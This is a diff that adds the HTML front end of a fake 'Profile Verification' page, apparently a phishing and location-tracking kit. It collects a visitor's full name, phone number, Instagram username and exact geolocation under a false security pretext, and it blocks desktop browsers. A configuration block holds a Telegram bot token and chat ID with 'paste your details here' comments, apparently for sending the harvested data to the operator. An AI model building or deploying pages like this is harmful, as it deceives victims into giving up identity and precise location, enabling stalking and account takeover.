@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Profile Verification</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Fonts for professional look -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <!-- 🛑 BLOCK SCREEN FOR DESKTOP/LAPTOP -->
+    <div id="desktop-block" class="hidden">
+        <div class="block-container">
+            <h1>⚠️ Access Restricted</h1>
+            <p>This verification process is strictly for <strong>mobile devices</strong> only.</p>
+            <p>Please open this link on your smartphone or tablet.</p>
+        </div>
+    </div>
+
+    <!-- 📱 MOBILE CONTENT (Initially Hidden) -->
+    <div id="mobile-content" class="hidden">
+        
+        <!-- Step 1: Permission Request -->
+        <div id="step-permission" class="card">
+            <div class="header">
+                <h2>Security Verification</h2>
+                <p>To proceed, we need to verify your device location and identity.</p>
+            </div>
+            
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" id="fullName" placeholder="Enter your full name">
+            </div>
+            
+            <div class="form-group">
+                <label>Phone Number</label>
+                <input type="tel" id="phone" placeholder="Enter your phone number">
+            </div>
+
+            <div class="form-group">
+                <label>Instagram Username</label>
+                <div class="input-group">
+                    <span>@</span>
+                    <input type="text" id="insta" placeholder="username">
+                </div>
+            </div>
+
+            <!-- 🎯 HIGHLIGHTED GEOLOCATION BUTTON -->
+            <button id="geo-btn" class="btn-primary">
+                <span>📍 Allow Exact Location</span>
+            </button>
+            
+            <p id="status-msg" class="status-text">Waiting for location...</p>
+        </div>
+
+        <!-- Step 2: Success State -->
+        <div id="step-success" class="card hidden">
+            <div class="success-icon">✅</div>
+            <h2>Verification Complete</h2>
+            <p>Your details have been securely recorded.</p>
+            <button onclick="location.reload()" class="btn-secondary">Close</button>
+        </div>
+    </div>
+
+    <script>
+        // 🔑 CONFIGURATION (PASTE YOUR DETAILS HERE)
+        const CONFIG = {
+            BOT_TOKEN: '8705436475:AAEiPnUhENkKCElGeJv4EYJQbCy2dEsON6g', // Replace with your token
+            CHAT_ID: '7289296911',     // Replace with your Chat ID
+            BLOCK_PC: true,                         // Set to true to block desktop/laptop
+            ONLY_MOBILE: true                       // Set to true to require mobile
+        };
+    </script>
+    <script src="script.js"></script>
+</body>
+  </html>
